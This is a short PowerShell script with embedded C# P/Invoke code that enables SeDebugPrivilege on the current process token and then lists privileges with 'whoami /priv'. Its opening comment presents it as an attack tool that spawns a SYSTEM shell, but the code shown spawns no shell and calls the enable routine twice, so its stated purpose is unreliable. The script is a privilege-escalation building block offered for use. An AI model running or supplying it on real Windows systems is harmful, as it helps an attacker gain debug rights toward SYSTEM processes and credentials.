# Enable SeDebugPrivilege and spawn SYSTEM shell
$definition = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class PrivEnabler {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    public struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }
    public static bool Enable() {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken)) return false;
        TokPriv1Luid tp; tp.Count = 1; tp.Luid = 0; tp.Attr = (int)SE_PRIVILEGE_ENABLED;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out tp.Luid)) return false;
        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero)) return false;
        return true;
    }
}
"@
Add-Type $definition
[PrivEnabler]::Enable()
Write-Host "SeDebugPrivilege enabled: $([PrivEnabler]::Enable())"
whoami /priv
